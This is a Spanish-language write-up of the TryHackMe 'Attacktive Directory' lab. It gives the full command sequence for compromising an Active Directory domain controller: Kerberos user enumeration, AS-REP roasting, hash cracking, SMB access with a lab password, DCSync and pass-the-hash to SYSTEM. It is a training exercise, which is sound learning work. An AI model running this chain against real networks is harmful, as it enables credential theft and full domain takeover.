# ⚔️ Attacktive Directory

## Descripción

**Attacktive Directory** es una máquina de TryHackMe orientada al aprendizaje de **Active Directory** desde la perspectiva de un Pentest Interno. Durante este laboratorio se realizaron actividades de reconocimiento, enumeración, obtención de credenciales, acceso a recursos compartidos y escalamiento de privilegios utilizando herramientas comunes en pruebas de seguridad.

## Objetivos

- Identificar servicios de Active Directory.
- Enumerar usuarios válidos del dominio.
- Obtener credenciales mediante AS-REP Roasting.
- Acceder a recursos compartidos mediante SMB.
- Realizar DCSync para obtener hashes del dominio.
- Utilizar Pass-the-Hash para acceder al Domain Controller.

## Herramientas utilizadas

- Nmap
- Kerbrute
- Impacket
- John the Ripper
- CrackMapExec
- SMBClient

## Desarrollo del laboratorio
### 0. Conexión al laboratorio

La direccion IP <10.65.171.91> de maquina de **Attacktive Directory** por TryHackMe

### 1. Conexión al laboratorio

Se estableció la conexión con la máquina vulnerable mediante el túnel VPN proporcionado por TryHackMe.

```bash
sudo chmod +x ./safevpn-thm.sh 
```
Solo se escuchen por el tunel entre la maquina de TryHackMe y maquina atacante

```bash
sudo ./safevpn-thm.sh 10.65.171.91 
```

### 2. Reconocimiento de servicios

Se realizó un reconocimiento completo para identificar los servicios relacionados con Active Directory.

```bash
nmap -p- -open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.65.171.91 -oN ADirectory 
```

**Servicios identificados**

- Kerberos (88)
- LDAP (389)
- SMB (445)
- RPC (135)
- DNS (53)

### 3. Enumeración de usuarios

Se identificaron usuarios válidos del dominio utilizando Kerberos.

```bash
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.65.171.91 userlist.txt  
```

## 4. AS-REP Roasting

Se solicitó un AS-REP para identificar cuentas vulnerables sin preautenticación Kerberos.

```bash
 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.65.171.91
```

Resultado:

- Obtención del hash Kerberos del usuario vulnerable.
- Guardamos el hash en un archivo.

## 5. Crackeo del hash

Se recuperó la contraseña en texto plano utilizando John the Ripper.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

---

## 6. Enumeración SMB

Se validaron las credenciales obtenidas y se accedió a los recursos compartidos del dominio.

**Validación de credenciales**

```bash
crackmapexec smb 10.65.171.91 -u 'svc-admin' -p 'management2005'
```

**Acceso al recurso compartido**

```bash
smbclient -L //10.65.171.91 --user 'svc-admin@spookysec.local' -p 'management2005' 
```

## 7. Obtención de nuevas credenciales

Se identificó información codificada en Base64 y posteriormente fue decodificada.

```bash
echo "<CADENA_BASE64>" | base64 -d
```

Resultado:

- Usuario **backup**
- Contraseña en texto plano

---

## 8. DCSync

Con la cuenta **backup** se obtuvieron los hashes NTLM del dominio.

```bash
 impacket-secretsdump -just-dc backup@spookysec.local
```

Resultado:

- Hash NTLM del usuario **Administrator**.

---

## 9. Pass-the-Hash

Finalmente se utilizó el hash NTLM para autenticarse como Administrator sin conocer su contraseña.

```bash
 impacket-psexec Administrator@spookysec.local -hashes LMHASH:NTHASH
```

Resultado:

- Acceso al Domain Controller con privilegios **NT AUTHORITY\SYSTEM**.

---

# 📚 Técnicas practicadas

- Reconocimiento con Nmap.
- Enumeración de usuarios mediante Kerberos.
- AS-REP Roasting.
- Crackeo de hashes.
- Enumeración SMB.
- Decodificación Base64.
- DCSync.
- Pass-the-Hash.

# 📚 Anexo

<img width="673" height="329" alt="image" src="https://github.com/user-attachments/assets/632f3ccb-9d45-4c2a-a487-232b3f45d412" />


# ⚠️ Aviso

Este laboratorio fue realizado únicamente dentro del entorno autorizado de **TryHackMe** con fines educativos. Ninguna de las técnicas descritas fue ejecutada sobre sistemas reales o sin autorización.
